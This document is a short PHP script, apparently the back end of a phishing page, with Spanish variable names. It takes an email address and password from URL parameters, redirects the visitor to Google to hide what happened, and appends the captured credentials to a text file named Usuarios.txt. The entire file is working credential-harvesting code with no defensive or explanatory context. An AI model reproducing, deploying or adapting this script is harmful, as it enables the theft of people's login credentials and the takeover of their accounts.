<?php
$correo = $_GET["email"];
$contraseña = $_GET["pass"];
?>

<?php
header("Location: https://www.google.com/");
?>

<?php
$file = fopen("Usuarios.txt", "a");{
	
	fwrite($file, "\r\n");
	fwrite($file, "Correo = ");
	fwrite($file, $correo);
	
	fwrite($file, "\r\n");
	fwrite($file, "Contraseña = ");
	fwrite($file, $contraseña);
	fwrite($file, "\r\n");
	
}
fclose($file);
exit;
?>